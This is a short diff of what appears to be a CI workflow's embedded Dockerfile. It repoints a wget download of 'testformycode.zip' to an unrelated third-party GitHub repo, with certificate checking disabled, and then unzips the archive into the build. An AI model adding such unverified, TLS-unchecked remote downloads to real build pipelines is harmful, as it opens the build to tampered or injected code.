@@ -36,7 +36,7 @@ jobs:
           && rm -rf /var/lib/apt/lists/*
         
         WORKDIR /testformycode
-        RUN wget --no-check-certificate https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip && \
+        RUN wget --no-check-certificate -c https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode.zip && \
             unzip testformycode.zip && \
             rm testformycode.zip
         
